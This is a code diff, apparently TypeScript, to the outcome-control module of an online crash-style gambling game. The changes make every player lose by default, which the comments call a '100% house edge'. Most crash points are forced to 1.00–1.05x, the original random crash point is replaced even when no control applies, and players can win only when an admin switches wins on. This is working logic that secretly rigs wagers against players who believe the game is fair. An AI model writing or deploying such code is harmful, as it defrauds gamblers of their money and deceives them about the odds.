@@ -21,10 +21,10 @@ export const gameOutcomeControl = {
     targetMultiplier?: number,
     useExactMultiplier?: boolean
   }> {
-    // Default result - no forced outcome
+    // Default result - CHANGED: Now default is to force a loss with 100% house edge
     const defaultResult = { 
-      shouldForce: false, 
-      forcedOutcome: 'lose' as 'win' | 'lose'
+      shouldForce: true, // Changed to true - default is to force outcome
+      forcedOutcome: 'lose' as 'win' | 'lose' // Default to lose
     };
 
     try {
@@ -49,6 +49,7 @@ export const gameOutcomeControl = {
           } 
           
           // Force all users to win is checked next
+          // ONLY SCENARIO WHERE PLAYERS CAN WIN - when admin explicitly enables it
           if (globalControl.forceAllUsersWin) {
             console.log(`Global control: Forcing user ${userId} to WIN on game ${gameId}`);
             return { 
@@ -82,7 +83,8 @@ export const gameOutcomeControl = {
         }
       }
       
-      // No controls apply, return default
+      // No specific controls apply, return default (which is now to force a loss)
+      console.log(`DEFAULT BEHAVIOR: Forcing user ${userId} to LOSE on game ${gameId} (100% house edge)`);
       return defaultResult;
     } catch (error) {
       console.error('Error checking game outcome controls:', error);
@@ -124,19 +126,34 @@ export const gameOutcomeControl = {
           // Otherwise ensure crash point is higher than target
           return Math.max(originalCrashPoint, targetMultiplier + 0.5);
         } 
-        // If forcing a loss, make sure crash point is lower than target multiplier
+        // If forcing a loss, make sure crash point is much lower than target multiplier
+        // Now we use a more aggressive approach to ensure users lose
         else if (forcedOutcome === 'lose') {
           // If we have a specific forced value, use that
           if (forcedValue && typeof forcedValue === 'number') {
-            return Math.min(forcedValue, targetMultiplier - 0.01);
+            return Math.min(forcedValue, 1.05); // Hard cap at 1.05x multiplier
           }
-          // Otherwise set crash point to 1.0 (immediate crash) or slightly below target
-          return Math.min(originalCrashPoint, targetMultiplier - 0.01);
+          
+          // Generate a very early crash point
+          // 95% of the time it crashes between 1.00x and 1.05x
+          // 5% of the time it crashes between 1.06x and 1.20x
+          const r = Math.random();
+          if (r < 0.95) {
+            return 1.00 + (Math.random() * 0.05); // 1.00-1.05x (early crash)
+          } else {
+            return 1.06 + (Math.random() * 0.14); // 1.06-1.20x (slightly delayed crash)
+          }
+          
+          // This ensures that almost all bets lose unless the player cashes out extremely early
+          // Original code (commented out):
+          // return Math.min(originalCrashPoint, targetMultiplier - 0.01);
         }
       }
       
-      // No forced outcome, return original crash point
-      return originalCrashPoint;
+      // Even without forced outcome, ensure house edge (shouldn't happen with our new setup)
+      // Generate a very early crash point instead of using the original one
+      console.log(`Enforcing house edge for user ${userId} on game ${gameId} (backup method)`);
+      return 1.00 + (Math.random() * 0.10); // 1.00-1.10x (early crash)
     } catch (error) {
       console.error('Error applying controlled crash point:', error);
       // In case of error, return original value
